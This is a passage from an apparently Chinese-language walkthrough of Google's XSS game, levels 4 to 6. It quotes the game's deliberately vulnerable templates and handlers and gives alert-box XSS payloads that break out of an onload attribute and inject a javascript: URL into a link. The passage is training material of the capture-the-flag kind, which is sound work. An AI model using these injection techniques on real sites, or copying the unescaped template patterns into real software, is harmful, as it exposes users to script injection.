href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>默认3秒<code>seconds = parseInt(seconds) || 3;</code></p><p>输入100，看到加载如下</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>于是想办法闭合，用单引号闭合<code>startTimer</code>，然后写弹窗再和后面的<code>&#39;)</code>闭合</p><blockquote><p>onload 事件会在页面或图像加载完成后立即发生</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>即变为<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>源码·confirm.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>直接讲next参数填入html，href也是可以执行JavaScript代码的</p><p>payload：</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>然后点<code>Next&gt;&gt;</code>就行</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>超链接标签<code>&lt;a&gt;</code>,用户点击相应按钮时可以跳转到新的页面（执行某个JavaScript），用到了这样的代码结构：</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>执行权首先落在doSomething()函数，若存在返回值则将返回值返给超链接进行合成</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token 